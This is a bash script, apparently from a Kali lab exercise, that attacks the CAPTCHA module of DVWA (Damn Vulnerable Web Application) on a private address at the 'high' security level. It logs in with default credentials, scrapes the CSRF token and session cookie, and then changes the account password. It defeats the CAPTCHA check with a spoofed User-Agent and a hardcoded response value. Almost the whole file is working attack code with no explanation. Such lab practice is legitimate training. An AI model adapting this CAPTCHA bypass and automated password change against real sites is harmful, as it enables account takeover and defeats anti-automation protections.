#!/bin/bash

SECURITY="high" #security level
USER="admin" #username
PASS="password" #current password

rm cookies.txt #removes old file with cookies

#saves login cookies and login page html to local files
curl -s -c cookies.txt \
-b "security=$SECURITY" \
http://192.168.56.105/DVWA/login.php \
>login.html

TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
PHPSESSID=$(awk '$6=="PHPSESSID" {print $7}' cookies.txt) #saves PHP session ID found in cookies

#logs in using cookies and user token
curl -s -b cookies.txt \
-b "security=$SECURITY" \
-d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
http://192.168.56.105/DVWA/login.php



NEW_PASS="password" #new password

#sends request and saves result in local file
{
echo "Current security level: $SECURITY"
echo "Current password: $PASS"
echo "Attempting to change the password to $NEW_PASS..."

RESPONSE=$(curl -s -X POST \
 -A "reCAPTCHA" \
 -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
 -d "step=1&password_new=$NEW_PASS&password_conf=$NEW_PASS&g-recaptcha-response=hidd3n_valu3&user_token=$TOKEN&Change=Change" \
http://192.168.56.105/DVWA/vulnerabilities/captcha/)

if echo "$RESPONSE" | grep -q "Password Changed."; then
    echo "Attempt result -> SUCCESS!"
else
    echo "Attempt result -> FAILURE"
fi
}> /home/kali/captcha_high.log
